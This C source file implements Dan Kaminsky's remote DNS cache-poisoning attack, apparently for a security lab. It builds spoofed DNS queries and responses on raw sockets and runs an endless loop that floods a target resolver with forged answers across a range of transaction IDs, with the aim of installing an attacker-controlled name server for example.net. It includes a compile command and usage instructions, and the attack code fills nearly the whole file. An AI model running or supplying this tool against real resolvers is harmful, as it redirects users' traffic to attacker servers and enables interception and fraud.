/******************************************************************
// ProgramName: remoteDNSAttack
// Author: 	Haichao Zhang
// Description:
//		This program performs the remote DNS attack.
//		(Dan Kaminsky's remote DNS attack)
//		Basically, this program will repeatly spoof
//		one DNS query for a certain unexisting domain
//		such as "xxxxx.example.net" to trigger the 
//		local DNS server to query the outside Internet
//		DNS servers for answer. At the same time, 
//		the program will spoof a lot of response packets
//		on behalf of the outside Internet server with 
//		different transaction id. This program doesn't
//		terminate automatically, so plz use Ctrl+C 
//		to terminate.
//		If the attack succeeds, you can observe the example.net
//		name server becomes ns.dnslabattacker.net.
//		
// Parameter: 4
//		1. the source IP address for the query packet
//		(this IP must belong to the local network 
//		or the local DNS server will refuse to help.)
//		
//		2. the local DNS server IP address. (also the 
//		destination IP for both spoofing packet)
//		
//		3. the malicious server "ns.dnslabattacker.net"
//		IP. This IP exists in the additional field of 
//		the spoofed response packet.
//		
//		4. the benign name server IP for "example.net".
//		also the source IP for the spoofing response packet.
// #Compile command: gcc -lpcap remoteDNSAttack.c -o remoteDNSAttack
*********************************************************************/
#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <libnet.h>

// The packet length
#define PCKT_LEN 8192

// the flag for resposne packet
#define FLAG_R 0x8400
// the flag for query packet
#define FLAG_Q 0x0100
     


// Can create separate header file (.h) for all headers' structure
// The IP header's structure
struct ipheader {
	unsigned char      iph_ihl:4, iph_ver:4;
	unsigned char      iph_tos;
	unsigned short int iph_len;
	unsigned short int iph_ident;
	unsigned short int iph_offset;
	unsigned char      iph_ttl;
	unsigned char      iph_protocol;
	unsigned short int iph_chksum;
	unsigned int       iph_sourceip;
	unsigned int       iph_destip;
};



// UDP header's structure
struct udpheader {
	unsigned short int udph_srcport;
	unsigned short int udph_destport;
	unsigned short int udph_len;
	unsigned short int udph_chksum;
};
// total udp header length: 8 bytes (=64 bits)



// DNS layer header's structure
struct dnsheader {
	unsigned short int query_id;
	unsigned short int flags;
	unsigned short int QDCOUNT;
	unsigned short int ANCOUNT;
	unsigned short int NSCOUNT;
	unsigned short int ARCOUNT;
};

// the surfix for each DNS item
struct dataEnd{
	unsigned short int  type;
	unsigned short int  class;
};


/*****************************************************
*function name: checksum
*		(used by the UDPchecksum)
*param: 	pointer to the buffer, size of
*		the buffer.
*return:	the checksum value for the field
******************************************************/
unsigned int checksum(uint16_t *usBuff, int isize)
{
	unsigned int cksum=0;
	for(;isize>1;isize-=2){
		cksum+=*usBuff++;
       }

	if(isize==1)
		cksum+=*(uint16_t *)usBuff;
	return (cksum);
}



/*****************************************************
*function name: checksum_udp_sum
*param: 	pointer to the IP header buffer, size of
*		the buffer.
*return:	the checksum value for the UDP header
******************************************************/
uint16_t check_udp_sum(uint8_t *buffer, int len)
{
        unsigned long sum=0;
	struct ipheader *tempI=(struct ipheader *)(buffer);
	struct udpheader *tempH=(struct udpheader *)(buffer+sizeof(struct ipheader));
	struct dnsheader *tempD=(struct dnsheader *)(buffer+sizeof(struct ipheader)+sizeof(struct udpheader));
	tempH->udph_chksum=0;

	sum=checksum( (uint16_t *)   &(tempI->iph_sourceip) ,8 );
	sum+=checksum((uint16_t *) tempH,len);

	sum+=ntohs(IPPROTO_UDP+len);
	
	sum=(sum>>16)+(sum & 0x0000ffff);
	sum+=(sum>>16);

	return (uint16_t)(~sum);
	
}
/*****************************************************
*function name: csum		
*param: 	pointer to the IP header buffer, size of
*		the IP field.
*return:	the checksum value for IP field
******************************************************/
unsigned short csum(unsigned short *buf, int nwords)
{    
	unsigned long sum;
	for(sum=0; nwords>0; nwords--)
		sum += *buf++;

	sum = (sum >> 16) + (sum &0xffff);
	sum += (sum >> 16);

	return (unsigned short)(~sum);
}



/*****************************************************
*function name: addOPT11		
*description: 	add 11 byte additional item to restrict
*		the further communication packet size, 
*		not related to our attack.
*param:		pointer to the writting buffer
*return:	null
******************************************************/
void addOPT11(unsigned char* data)
{
	int i;
	unsigned char temp[11]={0x00,0x00,0x29,0x10,0x00,0x00,
				0x00,0x80,0x00,0x00,0x00};
	for(i=0;i<11;i++)
		data[i]=temp[i];
}





/*****************************************************
*function name: constructIPHeader
*		
*param: 	pointer to the IP header, source ip,
*		destination ip
*description:	Not quite related to the DNS, specific 
*		the source and destination IP.(the checksum
*		relies on the udp header. so call this 
*		function after you finish construct udp
*		header.)
*return:	null
******************************************************/
void constructIPHeader(struct ipheader *ip_query,int packetLength,char* source_ip, char* dest_ip ){
	ip_query->iph_ihl = 5;
	ip_query->iph_ver = 4;
	ip_query->iph_tos = 0; // Low delay
	ip_query->iph_ident = htons(rand());
	ip_query->iph_ttl = 110; // hops
	ip_query->iph_protocol = 17; // UDP

	// specific the spoofed source and destination
	ip_query->iph_sourceip = inet_addr(source_ip);
	ip_query->iph_destip = inet_addr(dest_ip);
	ip_query->iph_len=htons(packetLength);
	// calculate the check sum, if you change the udp header, the csum must be called again.
	
}


/*****************************************************
*function name: constructUDPHeader
*		
*param: 	udpheader pointer,source port, destination ip, udp length
*		
*description:	DNS packet is a udp packet; when the source port is 53
*		it means this is a DNS response; if the dest port is 53
*		this is a DNS query packet
*return:	null
******************************************************/
void constructUDPHeader(struct udpheader *udp_query,int source_port, int dest_port,int length ){
	// udp header construction:
	udp_query->udph_srcport = htons(source_port); // random source port
	udp_query->udph_destport = htons(dest_port); // "destination_port==53" means it is a DNS query packet.
	udp_query->udph_len = htons(length); // the udp header and its payload total length

	// calculate the check sum, if you change the udp header, the csum must be called again.
	// Here we skip this, and will do it right before sending out the packet since there will
	// be some modifications for each packet(transaction id, query domain)
	
}





/*****************************************************
*function name: construct_dns_query		
*description: 	given the buffer, the function construct
*		the DNS query packet asking "aaaaa.example.net"
*		IP address
*param:		1. pointer to the buffer
*		2. source IP
*		3. destination IP
*return:	packet length
******************************************************/
int construct_dns_query(char* buffer_query, char* query_source_ip,char* local_DNS_ip ){

	// locate the ip header, udp header, dns header and dns payload
	struct ipheader *ip_query =
		 (struct ipheader *)buffer_query; // buffer begins here, IP header starts;
	struct udpheader *udp_query = 
		(struct udpheader *)(buffer_query + sizeof(struct ipheader)); // the udp header
	struct dnsheader *dns_query=
		(struct dnsheader*)(buffer_query +sizeof(struct ipheader)+sizeof(struct udpheader)); // the dns header starts here
	char *data_query = 
		(buffer_query +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader)); // the dns payload data starts here


	/* First, setup the DNS header for the query packet*/
	// set the dns header: flag = Query
	dns_query->flags=htons(FLAG_Q);
	// set the dns header: Question field Number = 1
	dns_query->QDCOUNT=htons(1); // this means the dns only ask for one domain's IP
	// DNS header construction finished


	/* Question field construction: */
	// query domain: we want the IP for "aaaaa.example.net"
	strcpy(data_query,"\5aaaaa\7example\3net");
	int length_query= strlen(data_query)+1;

	//  add the suffix : type: A(IPv4); class IN(Internet)
	struct dataEnd * end_query=(struct dataEnd *)(data_query+length_query);
	end_query->type=htons(1);
	end_query->class=htons(1);
	
	
	// calculate the whole packet length
	unsigned short int packetLength_query =(sizeof(struct ipheader) + sizeof(struct udpheader)+sizeof(struct dnsheader)+length_query+sizeof(struct dataEnd));

	// construct the UDP header for the query
	constructUDPHeader(udp_query, 4000+random()%1000, 53, (sizeof(struct udpheader)+sizeof(struct dnsheader)+length_query+sizeof(struct dataEnd)));
	// construct the IP header, not quite related to the DNS
	constructIPHeader(ip_query,packetLength_query,query_source_ip,local_DNS_ip);
	
	// return the whole packet length
	return packetLength_query;
}


/*****************************************************
*function name: construct_dns_answer		
*description: 	given the buffer, the function construct
*		the DNS query packet answering "aaaaa.example.net"
*		IP address
*param:		1. pointer to the buffer
*		2. source IP
*		3. destination IP
*		4. attacker malicious DNS server in the additional field
*return:	packet length
******************************************************/
int construct_dns_answer(char* buffer_answer, char* source_ip,char* dest_ip, char * attacker_DNS_ip ){
	
	// Our own headers' structures
	struct ipheader *ip_answer = (struct ipheader *) buffer_answer;
	struct udpheader *udp_answer = (struct udpheader *) (buffer_answer + sizeof(struct ipheader));
	struct dnsheader *dns_answer=(struct dnsheader*) (buffer_answer +sizeof(struct ipheader)+sizeof(struct udpheader));

	// the data payload for the packet  
	char *data_answer = (buffer_answer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));


	//construct the DNS header:
	dns_answer->flags=htons(FLAG_R); // Flag = response; this is a DNS response
	
	// the number for certain fields
	dns_answer->QDCOUNT=htons(1); // 1 question field
	dns_answer->ANCOUNT=htons(1); // 1 answer field
	dns_answer->NSCOUNT=htons(1); // 1 name server(authority) field
	dns_answer->ARCOUNT=htons(2); // 2 additional fields


	//!!! question for "aaaaa.example.net"
	strcpy(data_answer,"\5aaaaa\7example\3net");
	int length_answer= strlen(data_answer)+1;


	//  add the suffix : type: A(IPv4); class IN(Internet)
   	struct dataEnd * end_answer=(struct dataEnd *)(data_answer+length_answer);
    	end_answer->type=htons(1);
    	end_answer->class=htons(1);



	// continue to build 1 answer field:
	// the dnsd is the pointer we will use for the the further writing
	char *dnsd=data_answer+length_answer+sizeof(struct dataEnd); // track where we are writing
	// remember the start point of the data
	unsigned short int *domainPointer=(unsigned short int *)dnsd;// for shortening the packet length


	//!!! this is the answer field for aaaaa.example.net
	*domainPointer=htons(0xC00C);//use domain pointer to reference the answer
	// (0xc0 means this is not a string structure, but a reference to a string which exists in the packet)
	// (0x0c = 12 means the offset from the begining of the DNS header; which point to "www.example.net")
	dnsd+=2;

	//  add the suffix : type: A(IPv4); class IN(Internet)
	end_answer=(struct dataEnd*)dnsd;//type=A  class=0x0001
  	end_answer->type=htons(1);
  	end_answer->class=htons(1);
	dnsd+=sizeof(struct dataEnd);

	// ttl time to live
	*dnsd=2;//time to live 4 bytes = 0x20000000
	dnsd+=4;
	
	// the IP address: exact answer we want
	*(short *)dnsd=htons(4);//the answer IP length 2 bytes
	dnsd+=2;
	*(unsigned int*)dnsd=inet_addr(attacker_DNS_ip); // the answer for aaaaa.example.net
	dnsd+=4;


	//!!! Construction for authority field
	// nameserver=ns.dnslabattacker.net
	// the domain that the name server is in charge: example.net
	domainPointer=(short int*)dnsd;
	*domainPointer=htons(0xC012);// the same trick using reference
 	dnsd+=2;


	// add the surfix
	((struct dataEnd *)dnsd)->type=htons(2);//type =ns
	((struct dataEnd *)dnsd)->class=htons(1);//class 0x0001
	dnsd+=sizeof(struct dataEnd);

	// ttl time to live 
	*dnsd=2;//time to live 4 bytes =0x20000000 seconds
	dnsd+=4;

	// name server string construction 
	*(short *)dnsd=htons(23);//the nameserver length 2 bytes
	dnsd+=2;

	strcpy(dnsd,"\2ns");
	dnsd+=3;
	*(dnsd++)=14;
	strcpy(dnsd,"dnslabattacker\3net");
	dnsd+=14+5;
	


	//!!! Construction for the additional field 1
	// additional: ns.dnslabattacker.net -> IP

	// build the string for dnslabattacker.net
	strcpy(dnsd,"\2ns");
	dnsd+=3;
	*(dnsd++)=14;
	strcpy(dnsd,"dnslabattacker\3net");
	dnsd+=14+5;


	// add surfix
	((struct dataEnd *)dnsd)->type=htons(1);
	((struct dataEnd *)dnsd)->class=htons(1);
	dnsd+=sizeof(struct dataEnd);


	*dnsd=2;//time to live 4 bytes
	dnsd+=4;

	// IP address for ns.dnslabattacker.net
	*(short *)dnsd=htons(4);//the nameserver length 2 bytes
	dnsd+=2;
	*(unsigned int*)dnsd=inet_addr(attacker_DNS_ip);
	dnsd+=4;

	//!!! construction for the second additional field
	addOPT11(dnsd); // not related to the attack.
	dnsd+=11;

	// construct the udp header, the port number is fixed.
	constructUDPHeader(udp_answer, 53, 33333, dnsd-(char*)udp_answer);
	// construct the IP header, not quite related to the DNS
	constructIPHeader(ip_answer,dnsd-(char*)udp_answer+sizeof(struct ipheader),source_ip,dest_ip);
	
	// return the length for the packet
	return dnsd-(char*)udp_answer+sizeof(struct ipheader);
}




/*****************************************************
*function name: nextRoundQuestion	
*param: 	1.pointer to the query' question field
*		2.pointer to the answer' question field
*description:	switch to another unexisting domain
*		under example.net to query
*return:	null
******************************************************/
void nextRoundQuestion(char *data_query, char *data_answer)
{    
	int charnumber;
	charnumber=1+rand()%5;
	*(data_query+charnumber)+=1;
	*(data_answer+charnumber)+=1;
}


/***********************************************************
//function name:remoteDNSAttack
//param:	1.query packet source ip (char*)
//		2.local DNS ip (char*)
//		3.attacker_DNS_ip 
//			basically, ns.dnslabattacker.net'
//			IP address in the additional field
//			for the response packet
//		4.response source IP
//			it is also the local DNS server's query
//			target. who is the real name server for
//			example.net. 
//description:	This is the real function who did everything, 
//		refer to the program header!
//
//return:	null
//************************************************************/
void remoteDNSAttack(char *query_source_ip,
		     char *local_DNS_ip,
		     char *attacker_DNS_ip,
		     char *response_source_ip){
    
	int sd_query, sd_answer; // define the socket for both query and answer

	// setup the empty buffer for both packet
	char buffer_query[PCKT_LEN];
	char buffer_answer[PCKT_LEN];
	memset(buffer_query, 0, PCKT_LEN);
	memset(buffer_answer, 0, PCKT_LEN);

	// locate the ip header, udp header, dns header and dns payload
	struct ipheader *ip_query = (struct ipheader *) buffer_query; // buffer begins here, IP header starts;
	struct udpheader *udp_query = (struct udpheader *) (buffer_query + sizeof(struct ipheader)); // the udp header
	struct dnsheader *dns_query=(struct dnsheader*) (buffer_query +sizeof(struct ipheader)+sizeof(struct udpheader)); // the dns header starts here
	char *data_query = (buffer_query +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader)); // the dns payload data starts here
	// also the answer headers' structures
	struct ipheader *ip_answer = (struct ipheader *) buffer_answer;
	struct udpheader *udp_answer = (struct udpheader *) (buffer_answer + sizeof(struct ipheader));
	struct dnsheader *dns_answer=(struct dnsheader*) (buffer_answer +sizeof(struct ipheader)+sizeof(struct udpheader));
	char *data_answer = (buffer_answer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader)); // the dns payload data starts here
	// construct the DNS query for the attacker
	int packetLength_query = construct_dns_query(buffer_query, query_source_ip,local_DNS_ip );
	// construct the DNS answer for the attacker
	int packetLength_answer = construct_dns_answer(buffer_answer, response_source_ip,local_DNS_ip,attacker_DNS_ip);
	



	// Source and destination addresses: IP and port
	struct sockaddr_in sin, din;
	int one = 1;
	const int *val = &one;
	


     
	// *** Create a raw socket with UDP protocol *** //
	sd_query = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
	sd_answer = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
	if(sd_query<0 || sd_answer <0)
		printf("socket error\n");
	// The address family
	sin.sin_family = AF_INET;
	din.sin_family = AF_INET;
	// Port numbers
	sin.sin_port = htons(33333);
	din.sin_port = htons(53);

	// IP addresses
	sin.sin_addr.s_addr = inet_addr(local_DNS_ip);
	din.sin_addr.s_addr = inet_addr(query_source_ip);
	// *** Create a raw socket with UDP protocol end *** //

  

	// Calculate the checksum for integrity
	ip_answer->iph_chksum = csum((unsigned short *)buffer_answer, sizeof(struct ipheader) + sizeof(struct udpheader));
	ip_query->iph_chksum = csum((unsigned short *)buffer_query, sizeof(struct ipheader) + sizeof(struct udpheader));
    
  



	// set the socket operation for both query and response
	if(setsockopt(sd_query, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0 )
	{
		printf("error\n");	
		exit(-1);
	}
	if(setsockopt(sd_answer, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0 )
	{
		printf("error\n");	
		exit(-1);
	}



	// this while loop will send a query to trigger the local DNS server to query a.iana-servers.net
	// (the real nameserver for example.net) then followed by 101 response packets with different 
	// transaction id.
	while(1){

		// next round: change to another unexisting domain to query	
		nextRoundQuestion(data_query,data_answer);

		// update the checksum
		udp_query->udph_chksum=check_udp_sum(buffer_query, packetLength_query-sizeof(struct ipheader));
		// send out the query
		if(sendto(sd_query, buffer_query, packetLength_query, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
			printf("packet send error %d which means %s\n",errno,strerror(errno));

	
			dns_answer->query_id=301; // tansaction id: just a lucky guess for the beginning

			sleep(0.7); // wait for the query triggering the local DNS server; then we will send out the response

			int count;
			for(count=0;count<=100;count++)
			{
        
				dns_answer->query_id++; // try different transaction id: 301~401 for the range

				// update the checksum every time we modify the packet.
				udp_answer->udph_chksum=check_udp_sum(buffer_answer, packetLength_answer-sizeof(struct ipheader));

				// send out the response dns  packet
				if(sendto(sd_answer, buffer_answer, packetLength_answer, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
					printf("packet send error %d which means %s\n",errno,strerror(errno));		
			}

			sleep(0.1); // don't flood the server too much to freeze the host machine
	}
	
	close(sd_query);
}




// main function, refer to the program description
int main(int argc, char *argv[])
{
    	if(argc != 5){
    		printf("- Invalid parameters!!!\nPlease enter 4 ip addresses\nFrom first to last: query_source IP,victimDNS_IP, malicious_DNSIP , response_SOURCE_IP\n");
		//argv[1] spoofed query source ip
		//argv[2] destination DNS server
		//argv[3] spoof answer ip
		//argv[4] spoofed source
    		exit(-1);
    	}

	// begin the remote DNS attack!!!
	remoteDNSAttack(argv[1],argv[2],argv[3],argv[4]);
	
}
